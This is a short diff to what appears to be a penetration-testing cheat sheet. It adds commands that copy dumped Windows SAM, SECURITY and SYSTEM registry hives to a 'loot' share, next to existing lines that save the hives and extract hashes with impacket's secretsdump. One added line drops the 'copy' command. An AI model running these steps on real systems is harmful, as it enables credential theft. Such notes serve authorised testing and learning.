@@ -3693,6 +3693,11 @@ reg save hklm\sam c:\sam
 reg save hklm\system c:\system
 ````
 ````
+copy C:\sam z:\loot
+copy c:\security z:\loot
+c:\system z:\loot
+````
+````
 /opt/impacket/examples/secretsdump.py -sam sam -security security -system system LOCAL
 ````
 ````
